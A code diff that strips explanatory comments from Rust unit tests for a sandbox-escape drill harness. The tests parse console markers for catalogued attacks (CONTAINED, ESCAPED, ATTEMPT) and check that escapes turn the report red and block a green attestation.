-        // The bound FAILED: the oversized alloc HELD, so the corpus printed `Mx_memhog ESCAPED` AFTER
-        // the `ATTEMPT` sentinel. The later ESCAPED MUST override the provisional Contained ⇒ RED.
-        // A mutant that `break`s on ATTEMPT (never seeing the ESCAPED) is killed here.
         let mut s = green_console();
         s = s.replace(
             &format!("{MEMHOG_ID} CONTAINED extra=stuff\n"),
@@ -820,8 +564,6 @@ mod tests {
 
     #[test]
     fn memhog_with_no_marker_at_all_is_did_not_run() {
-        // No ATTEMPT, no ESCAPED, no CONTAINED for the memhog ⇒ the attack did not run ⇒ RED (the
-        // structural ATTEMPT exception NEVER invents a green from a totally-absent marker).
         let s = green_console().replace(&format!("{MEMHOG_ID} CONTAINED extra=stuff\n"), "");
         let report = parse_console(&s);
         assert_eq!(*outcome_for(&report, MEMHOG_ID), AttackOutcome::DidNotRun);
@@ -829,7 +571,6 @@ mod tests {
         assert!(!report.is_green());
     }
 
-    /// Test helper: the outcome of one catalogued attack in a parsed report.
     fn outcome_for<'a>(report: &'a DrillReport, id: &str) -> &'a AttackOutcome {
         &report
             .outcomes
@@ -841,7 +582,6 @@ mod tests {
 
     #[test]
     fn attestation_is_refused_over_a_red_drill() {
-        // The structural guard: a green attestation can NEVER be minted over a red drill.
         let mut console = green_console();
         console = console.replace("K1_module CONTAINED", "K1_module ESCAPED");
         let red = parse_console(&console);
@@ -890,7 +630,6 @@ mod tests {
         assert_eq!(att.total_escapes, 0);
         assert_eq!(att.corpus_version, CORPUS_VERSION);
         assert_eq!(att.gate_backend, Backend::FirecrackerMicrovm);
-        // Firecracker exercised; gVisor recorded as a NAMED residual (not faked).
         assert!(att
             .backends
             .iter()
@@ -901,14 +640,12 @@ mod tests {
             .any(|b| b.backend == Backend::GvisorRunsc
                 && !b.exercised
                 && b.residual_note.is_some()));
-        // The named residuals are carried in writing (the no-floor / permanent-gate posture).
         assert!(att.residuals.iter().any(|r| r.contains("PERMANENT GATE")));
         assert!(att.residuals.iter().any(|r| r.contains("CI-P28")));
         assert!(att
             .residuals
             .iter()
             .any(|r| r.contains("CI-P27") || r.contains("P-348")));
-        // The green line + JSON serialize.
         assert!(att.green_line().starts_with("[AG-D4 GREEN]"));
         assert!(att.green_line().contains("total-escapes=0"));
         let json = att.to_json();
